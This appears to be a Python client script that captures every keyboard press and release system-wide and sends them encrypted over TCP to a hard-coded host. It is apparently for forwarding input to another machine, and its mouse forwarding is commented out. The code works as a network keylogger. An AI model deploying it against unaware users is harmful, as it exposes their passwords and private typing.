import pynput.keyboard
import socket
import zono.zonocrypt
import pynput.mouse as mouse 

objcrypt = zono.zonocrypt.objcrypt(
    hash_algorithm=zono.zonocrypt.objcrypt.SHA512)


cl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



PORT = 4245
HEADER = 512
FORMAT = 'utf-8'


cl.connect(('10.20.125.221',4245))


def send_raw(pkt):
    message = objcrypt.encode(pkt)
    msg_length = len(message)

    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))

    cl.send(send_length)
    cl.send(message)


def recv_raw():
    msg_len = int(cl.recv(HEADER).decode(FORMAT))
    msg = cl.recv(msg_len)
    msg = objcrypt.decode(msg)
    return msg





def on_press(x):
    send_raw(dict(
        action='press',
        inf=x
    ))

def on_release(x):
    send_raw(dict(
        action='release',
        inf=x
    ))

def on_move(x,y):
    send_raw(dict(
        action='move',
        inf=(x,y)
    ))

def on_scroll(x):
    print(x)

def on_m_press(x):
    send_raw(dict(
        action='press_mouse',
        inf=x
    ))
def on_m_release(x):
    send_raw(dict(
        action='release_mouse',
        inf=x
    ))



kbd = pynput.keyboard.Listener(on_press=on_press,on_release=on_release)
# ml = mouse.Listener(
    # on_move=on_move,
    # on_press=on_m_press,
    # on_release=on_m_release,
    # on_scroll=on_scroll
# )
kbd.start()
# ml.start()
kbd.join()


